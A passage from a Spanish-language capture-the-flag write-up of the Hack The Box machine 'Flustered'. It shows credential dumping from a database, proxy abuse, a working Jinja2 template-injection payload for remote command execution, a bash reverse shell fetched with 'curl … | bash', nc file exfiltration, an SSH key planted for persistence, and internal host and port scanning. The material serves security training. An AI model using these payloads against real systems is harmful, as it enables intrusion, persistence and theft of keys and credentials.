</span></pre></table></code></div></div><p>Salimos del docker con <code class="language-plaintext highlighter-rouge">CTRL+D</code> y reiniciamos el docker:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">┌─[✗]─[root@h4cknet]─[/tmp/mysql]
</span><span class="gp">└──╼ #</span>docker stop mariadb 
<span class="go">mariadb
┌─[root@h4cknet]─[/tmp/mysql]
</span><span class="gp">└──╼ #</span>docker start mariadb 
<span class="go">mariadb
</span></pre></table></code></div></div><p>Nos ejecutamos mysql y funcionara perfectamente:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>docker <span class="nb">exec</span> <span class="nt">-it</span> mariadb mysql
</pre></table></code></div></div><p>Veamos las bases de datos y su contenido:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="gp">MariaDB [(none)]&gt;</span><span class="w"> </span>show databases<span class="p">;</span>
<span class="go">+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| squid              |
+--------------------+
4 rows in set (0.000 sec)

</span><span class="gp">MariaDB [(none)]&gt;</span><span class="w"> </span>use squid<span class="p">;</span>
<span class="go">Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
</span><span class="gp">MariaDB [squid]&gt;</span><span class="w"> </span>show tables<span class="p">;</span>
<span class="go">+-----------------+
| Tables_in_squid |
+-----------------+
| passwd          |
+-----------------+
1 row in set (0.000 sec)

</span><span class="gp">MariaDB [squid]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">*</span> from passwd<span class="p">;</span>
<span class="go">+----------------+---------------+---------+----------------+---------+
| user           | password      | enabled | fullname       | comment |
+----------------+---------------+---------+----------------+---------+
</span><span class="gp">| lance.friedman | o&gt;</span>WJ5-jD&lt;5^m3 |       1 | Lance Friedman |         |
<span class="go">+----------------+---------------+---------+----------------+---------+
1 row in set (0.000 sec)

</span><span class="gp">MariaDB [squid]&gt;</span><span class="w">
</span></pre></table></code></div></div><p>La base de datos se llama <code class="language-plaintext highlighter-rouge">squid</code>, con lo cual, entendemos que es para el proxy que encontramos antes. Ademas, tenemos usuario y contraseña, asi que, vamos a probar a conectarnos al proxy con esas credenciales.</p><h1 id="conexión-a-proxy">Conexión a proxy.</h1><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="go">┌─[✗]─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>curl <span class="nt">--proxy</span> <span class="s1">'http://lance.friedman:o&gt;WJ5-jD&lt;5^m3@10.10.11.131:3128'</span> http://127.0.0.1
<span class="gp">&lt;!DOCTYPE html&gt;</span><span class="w">
</span><span class="gp">&lt;html&gt;</span><span class="w">
</span><span class="gp">&lt;head&gt;</span><span class="w">
</span><span class="gp">&lt;title&gt;</span>Welcome to nginx!&lt;/title&gt;
<span class="gp">&lt;style&gt;</span><span class="w">
</span><span class="go">    body {
</span><span class="gp">        width: 35em;</span><span class="w">
</span><span class="gp">        margin: 0 auto;</span><span class="w">
</span><span class="gp">        font-family: Tahoma, Verdana, Arial, sans-serif;</span><span class="w">
</span><span class="go">    }
</span><span class="gp">&lt;/style&gt;</span><span class="w">
</span><span class="gp">&lt;/head&gt;</span><span class="w">
</span><span class="gp">&lt;body&gt;</span><span class="w">
</span><span class="gp">&lt;h1&gt;</span>Welcome to nginx!&lt;/h1&gt;
<span class="gp">&lt;p&gt;</span>If you see this page, the nginx web server is successfully installed and
<span class="gp">working. Further configuration is required.&lt;/p&gt;</span><span class="w">
</span><span class="go">
</span><span class="gp">&lt;p&gt;</span>For online documentation and support please refer to
<span class="gp">&lt;a href="http://nginx.org/"&gt;</span>nginx.org&lt;/a&gt;.&lt;br/&gt;
<span class="go">Commercial support is available at
</span><span class="gp">&lt;a href="http://nginx.com/"&gt;</span>nginx.com&lt;/a&gt;.&lt;/p&gt;
<span class="go">
</span><span class="gp">&lt;p&gt;</span>&lt;em&gt;Thank you <span class="k">for </span>using nginx.&lt;/em&gt;&lt;/p&gt;
<span class="gp">&lt;/body&gt;</span><span class="w">
</span><span class="gp">&lt;/html&gt;</span><span class="w">
</span></pre></table></code></div></div><p>La cosa ha cambiado, ya no nos pone access denied y vemos una nueva pagina de nginx.</p><h2 id="analizando-directorios"><span class="mr-2">Analizando directorios.</span><a href="#analizando-directorios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Analicemos los directorios con <code class="language-plaintext highlighter-rouge">gobuster</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>gobuster <span class="nb">dir</span> <span class="nt">--proxy</span> <span class="s1">'http://lance.friedman:o&gt;WJ5-jD&lt;5^m3@10.10.11.131:3128'</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--url</span> http://127.0.0.1
<span class="gp">Error: error on creating gobusterdir: proxy URL is invalid (parse "http://lance.friedman:o&gt;</span>WJ5-jD&lt;5^m3@10.10.11.131:3128<span class="s2">": net/url: invalid userinfo)
</span></pre></table></code></div></div><p>A pesar de estar bien puesto, nos salta un error con la url. Los símbolos especiales los pondremos en hexadecimal, con man ascii vemos la tabla y su correspondiente código. Quedaría algo asi:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>gobuster <span class="nb">dir</span> <span class="nt">-t</span> 200 <span class="nt">--proxy</span> <span class="s1">'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128'</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--url</span> http://127.0.0.1
<span class="go">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/16 00:20:14 Starting gobuster in directory enumeration mode
===============================================================
</span><span class="gp">/app                  (Status: 301) [Size: 185] [--&gt;</span><span class="w"> </span>http://127.0.0.1/app/]
<span class="go">                                                                           
===============================================================
2022/02/16 00:21:14 Finished
===============================================================
</span></pre></table></code></div></div><p>Nos reporta <code class="language-plaintext highlighter-rouge">/app</code>. Vamos a buscar en ese directorio (<code class="language-plaintext highlighter-rouge">http://127.0.0.1/app</code>) archivos con extensiones <code class="language-plaintext highlighter-rouge">.py</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>gobuster <span class="nb">dir</span> <span class="nt">-t</span> 200 <span class="nt">--proxy</span> <span class="s1">'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128'</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--url</span> http://127.0.0.1/app <span class="nt">-x</span> py
<span class="go">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1/app
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              py
[+] Timeout:                 10s
===============================================================
2022/02/16 00:24:20 Starting gobuster in directory enumeration mode
===============================================================
</span><span class="gp">/templates            (Status: 301) [Size: 185] [--&gt;</span><span class="w"> </span>http://127.0.0.1/app/templates/]
<span class="gp">/static               (Status: 301) [Size: 185] [--&gt;</span><span class="w"> </span>http://127.0.0.1/app/static/]   
<span class="go">/app.py               (Status: 200) [Size: 748]                                      
</span><span class="gp">/config               (Status: 301) [Size: 185] [--&gt;</span><span class="w"> </span>http://127.0.0.1/app/config/]   
<span class="go">                                                                                     
===============================================================
2022/02/16 00:26:25 Finished
===============================================================
</span></pre></table></code></div></div><p>Nos encuentra varias cosas, voy a ver el <code class="language-plaintext highlighter-rouge">app.py</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">--proxy</span> <span class="s1">'http://lance.friedman:o&gt;WJ5-jD&lt;5^m3@10.10.11.131:3128'</span> http://127.0.0.1/app/app.py | batcat <span class="nt">-l</span> py
</pre></table></code></div></div><p><img data-src="/assets/images/htb/flustered/app_py.png" alt="app.py" data-proofer-ignore></p><blockquote><p>NOTA: batcat lo utilizo para ver mejor el codigo, no es necesario ejecutarlo.</p></blockquote><p>Viendo el codigo encontramos que podemos controlar el output de la web:</p><figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.11.131/"</span> <span class="nt">-H</span> <span class="s2">"Content-type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"siteurl": "test"}'</span>
<span class="go">
</span><span class="gp">    &lt;html&gt;</span><span class="w">
</span><span class="gp">    &lt;head&gt;</span><span class="w">
</span><span class="gp">    &lt;title&gt;</span><span class="nb">test</span> - Coming Soon&lt;/title&gt;
<span class="gp">    &lt;/head&gt;</span><span class="w">
</span><span class="gp">    &lt;body style="background-image: url('/static/steampunk-3006650_1280.webp');</span>background-size: 100%<span class="p">;</span>background-repeat: no-repeat<span class="p">;</span><span class="s2">"&gt; 
</span><span class="gp">    &lt;/body&gt;</span><span class="w">
</span><span class="gp">    &lt;/html&gt;</span></code></pre></figure><h2 id="burpsuite"><span class="mr-2">Burpsuite.</span><a href="#burpsuite" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Nos abrimos BurpSuite para probar <code class="language-plaintext highlighter-rouge">Jinja2 - Basic injection</code>. Primero tenemos que lanzar el curl y mandarlo al proxy de burpsuite:</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.11.131/"</span> <span class="nt">-H</span> <span class="s2">"Content-type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"siteurl": "{{7*7}}"}'</span> <span class="nt">--proxy</span> http://127.0.0.1:8080</code></pre></figure><p>Modificamos la peticion por lo siguiente:</p><p><img data-src="/assets/images/htb/flustered/burpsuite.png" alt="burpsuite" data-proofer-ignore></p><p>Y nos responde correctamente.</p><h1 id="ejecución-de-comandos">Ejecución de comandos.</h1><p>¿Como ejecutamos comandos con esto?</p><p>Intentamos lanzarnos un ping a nuestra maquina. Para ello, nos pondremos en escucha <code class="language-plaintext highlighter-rouge">tcpdump -i tun0 icmp -n</code> y ejecutamos lo siguiente:</p><figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.11.131/"</span> <span class="nt">-H</span> <span class="s2">"Content-type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"siteurl": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").system(\"ping -c 1 10.10.16.8\")}}{%endif%}{%endfor%}"}'</span>
<span class="go">
</span><span class="gp">    &lt;html&gt;</span><span class="w">
</span><span class="gp">    &lt;head&gt;</span><span class="w">
</span><span class="gp">    &lt;title&gt;</span>0 - Coming Soon&lt;/title&gt;
<span class="gp">    &lt;/head&gt;</span><span class="w">
</span><span class="gp">    &lt;body style="background-image: url('/static/steampunk-3006650_1280.webp');</span>background-size: 100%<span class="p">;</span>background-repeat: no-repeat<span class="p">;</span><span class="s2">"&gt; 
</span><span class="gp">    &lt;/body&gt;</span><span class="w">
</span><span class="gp">    &lt;/html&gt;</span></code></pre></figure><p>Por aqui recibimos la traza:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered/content]
</span><span class="gp">└──╼ #</span>tcpdump <span class="nt">-i</span> tun0 icmp <span class="nt">-n</span>
<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
</span><span class="gp">01:01:14.409631 IP 10.10.11.131 &gt;</span><span class="w"> </span>10.10.16.8: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>30669, <span class="nb">seq </span>1, length 64
<span class="gp">01:01:14.409663 IP 10.10.16.8 &gt;</span><span class="w"> </span>10.10.11.131: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>30669, <span class="nb">seq </span>1, length 64
</pre></table></code></div></div><p>Ahora vamos a ganar acceso a la maquina. Nos creamos un index.html que en realidad tendra codigo en bash:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered/content]
</span><span class="gp">└──╼ #</span><span class="nb">cat </span>index.html 
<span class="gp">#</span><span class="o">!</span>/bin/bash
<span class="go">
</span><span class="gp">bash -i &gt;</span>&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1
</pre></table></code></div></div><p>Lanzamos un servidor en python para que la maquina victima se conecte y obtenga el index.html:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3.9 <span class="nt">-m</span> http.server 80
</pre></table></code></div></div><p>Nos ponemos en escucha, en mi caso, por el puerto 443:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-nvlp</span> 443
</pre></table></code></div></div><p>Lanzamos el comando remoto para que la maquina se conecte a la nuestra:</p><figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.11.131/"</span> <span class="nt">-H</span> <span class="s2">"Content-type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"siteurl": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__[\"__import__\"](\"os\").system(\"curl 10.10.16.8 | bash\")}}{%endif%}{%endfor%}"}'</span>
<span class="gp">&lt;html&gt;</span><span class="w">
</span><span class="gp">&lt;head&gt;</span>&lt;title&gt;504 Gateway Time-out&lt;/title&gt;&lt;/head&gt;
<span class="gp">&lt;body bgcolor="white"&gt;</span><span class="w">
</span><span class="gp">&lt;center&gt;</span>&lt;h1&gt;504 Gateway Time-out&lt;/h1&gt;&lt;/center&gt;
<span class="gp">&lt;hr&gt;</span>&lt;center&gt;nginx/1.14.2&lt;/center&gt;
<span class="gp">&lt;/body&gt;</span><span class="w">
</span><span class="gp">&lt;/html&gt;</span></code></pre></figure><blockquote><p>Estamos haciendo un curl a nuestro servidor de python y luego lo pipeamos con la bash <code class="language-plaintext highlighter-rouge">curl 10.10.16.8 | bash</code>.</p></blockquote><h1 id="acceso-a-la-maquina">Acceso a la maquina.</h1><p>Ya estamos dentro de la maquina victima. Ahora vamos a obtener acceso al usuario jennifer para capturar la flag de user.</p><p>Si recordamos, el <code class="language-plaintext highlighter-rouge">vol1</code> no podiamos montarlo ya que no teniamos los ficheros ssl, ahora podremos enviarlos a nuestra maquina para montar el <code class="language-plaintext highlighter-rouge">vol1</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[~]
</span><span class="gp">└──╼ #</span><span class="nb">cd</span> /etc/ssl
<span class="go">┌─[root@h4cknet]─[~]
</span><span class="gp">└──╼ #</span>nc <span class="nt">-nvlp</span> 443 <span class="o">&gt;</span> glusterfs.ca
<span class="go">
</span><span class="gp">www-data@flustered:/etc/ssl$</span><span class="w"> </span>nc 10.10.16.8 443 &lt; glusterfs.ca
</pre></table></code></div></div><p>Hariamos todo igual para cada fichero(.key y .pem).</p><p>Montamos el <code class="language-plaintext highlighter-rouge">vol1</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mount <span class="nt">-t</span> glusterfs 10.10.11.131:/vol1 /mnt/flustered/
</pre></table></code></div></div><p>Encontramos el directorio de jennifer, con lo cual, podemos ver la flag. Ademas podemos añadir nuestra clave publica de ssh para conectarnos.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[~]
</span><span class="gp">└──╼ #</span>ssh-keygen 
<span class="go">┌─[root@h4cknet]─[~]
</span><span class="gp">└──╼ #</span><span class="nb">cat</span> .ssh/id_rsa.pub | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
<span class="go">┌─[root@h4cknet]─[/mnt/flustered]
</span><span class="gp">└──╼ #</span><span class="nb">cd</span> /mnt/flustered
<span class="go">┌─[root@h4cknet]─[/mnt/flustered]
</span><span class="gp">└──╼ #</span>nano .ssh/authorized_keys
<span class="go">CTRL+SHIFT+V 
Guardamos y nos conectamos.
</span></pre></table></code></div></div><h1 id="escalar-privilegios">Escalar privilegios.</h1><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="gp">jennifer@flustered:~$</span><span class="w"> </span><span class="nb">hostname</span> <span class="nt">-I</span>
<span class="go">10.10.11.131 172.17.0.1 dead:beef::250:56ff:feb9:4e03
</span><span class="gp">jennifer@flustered:~$</span><span class="w"> </span>ip a
<span class="gp">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt;</span><span class="w"> </span>mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
<span class="go">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
</span><span class="gp">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span><span class="w"> </span>mtu 1500 qdisc mq state UP group default qlen 1000
<span class="go">    link/ether 00:50:56:b9:4e:03 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.131/24 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:4e03/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:4e03/64 scope link 
       valid_lft forever preferred_lft forever
</span><span class="gp">3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span><span class="w"> </span>mtu 1500 qdisc noqueue state UP group default 
<span class="go">    link/ether 02:42:ac:e0:90:c0 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:acff:fee0:90c0/64 scope link 
       valid_lft forever preferred_lft forever
</span><span class="gp">5: veth61376bc@if4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span><span class="w"> </span>mtu 1500 qdisc noqueue master docker0 state UP group default 
<span class="go">    link/ether aa:f7:ab:2b:9c:6f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::a8f7:abff:fe2b:9c6f/64 scope link 
       valid_lft forever preferred_lft forever
</span></pre></table></code></div></div><p>Tenemos un docker corriendo en la ip <code class="language-plaintext highlighter-rouge">172.17.0.1</code>. No podemos listar las imagenes ni los contenedores porque no disponemos de permisos.</p><p>Vamos a fuzzear activos validos. Nos crearemos un script en bash que realizara un ping a un rango de ips.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">for </span>ip <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 172.17.0.</span><span class="nv">$ip</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"HOST 172.17.0.</span><span class="nv">$ip</span><span class="s2"> esta activo"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</pre></table></code></div></div><p>Lanzamos el script:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">jennifer@flustered:/tmp$</span><span class="w"> </span>./hostDiscovery.sh 
<span class="go">HOST 172.17.0.1 esta activo
HOST 172.17.0.2 esta activo
</span></pre></table></code></div></div><p>Tenemos una nueva ip. Ahora vamos a escanear sus puertos abiertos. Creamos otro script parecido al anterior:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">for </span>puerto <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/172.17.0.2/</span><span class="nv">$puerto</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Puerto </span><span class="nv">$puerto</span><span class="s2"> abierto"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</pre></table></code></div></div><p>Lanzamos el script:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">jennifer@flustered:/tmp$</span><span class="w"> </span>./portDiscovery.sh 
<span class="go">Puerto 10000 abierto
</span></pre></table></code></div></div><p>Nos detecta el puerto 10000. No sabemos que hay detras de este puerto. Probamos a lanzar un <code class="language-plaintext highlighter-rouge">curl</code> para saber si es http:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">jennifer@flustered:/tmp$</span><span class="w"> </span>curl http://172.17.0.2:10000
<span class="gp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><span class="w">
</span><span class="gp">&lt;Error&gt;</span><span class="w">
</span><span class="gp">  &lt;Code&gt;</span>InvalidQueryParameterValue&lt;/Code&gt;
<span class="gp">  &lt;Message&gt;</span>Value <span class="k">for </span>one of the query parameters specified <span class="k">in </span>the request URI is invalid.
<span class="go">RequestId:48e57e82-88ed-4963-b35d-bb53b272626a
</span><span class="gp">Time:2022-02-16T19:52:33.342Z&lt;/Message&gt;</span><span class="w">
